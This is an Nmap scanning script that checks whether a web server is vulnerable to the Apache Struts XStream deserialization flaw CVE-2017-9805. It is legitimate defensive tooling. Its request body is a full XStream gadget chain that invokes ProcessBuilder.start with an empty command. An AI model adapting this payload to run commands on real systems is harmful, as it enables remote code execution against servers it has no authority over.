description = [[
Detects whether the specified URL is vulnerable to the Apache Struts REST Plugin XStream
Remote Code Execution Vulnerability (CVE-2017-9805).
]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"

---
-- @usage
-- nmap -p <port> --script http-vuln-cve2017-9805 <target>
--
-- @output
-- PORT    STATE SERVICE
-- 80/tcp  open  http
-- | http-vuln-cve2017-9805:
-- |   VULNERABLE
-- |   Apache Struts REST Plugin XStream Remote Code Execution Vulnerability
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2017-9805
-- |
-- |     Disclosure date: 2017-09-15
-- |     References:
-- |       https://cwiki.apache.org/confluence/display/WW/S2-052
-- |       https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement
-- |_      https://www.r00tpgp.com/2019/02/detecting-apache-struts-s2-052.html
--
-- @args http-vuln-cve2017-9805.method The HTTP method for the request. The default method is "POST".
-- @args http-vuln-cve2017-9805.path The URL path to request. The default path is "/".

author = "r00tpgp"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln" }

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = "Apache Struts REST Plugin XStream RCE",
    state = vulns.STATE.NOT_VULN,
    description = [[
The REST Plugin in Apache Struts 2.1.2 through 2.3.x before 2.3.34 and 2.5.x before 2.5.13 uses an XStreamHandler with an instance of XStream for 
deserialization without any type filtering, which can lead to Remote Code Execution when deserializing XML payloads
    ]],
    IDS = {
        CVE = "CVE-2017-9805"
    },
    references = {
        'https://cwiki.apache.org/confluence/display/WW/S2-052',
	'https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement',
        'https://www.r00tpgp.com/2019/02/detecting-apache-struts-s2-052.html'
    },
    dates = {
        disclosure = { year = '2017', month = '09', day = '15' }
    }
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local method = stdnse.get_script_args(SCRIPT_NAME..".method") or "POST"
  local path = stdnse.get_script_args(SCRIPT_NAME..".path") or "/"

  local body = {
   '<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string></string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer/><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>'
  }

   local options = {
    header = {
      Connection = "close",
      ["Content-Type"] = "application/xml",
    },
    content = body
  }

  local response = http.generic_request(host, port, method, path, options )

  if response and string.match(response.body, "org.apache.struts2.rest.handler.XStreamHandler.toObject") then
    vuln.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln)
end
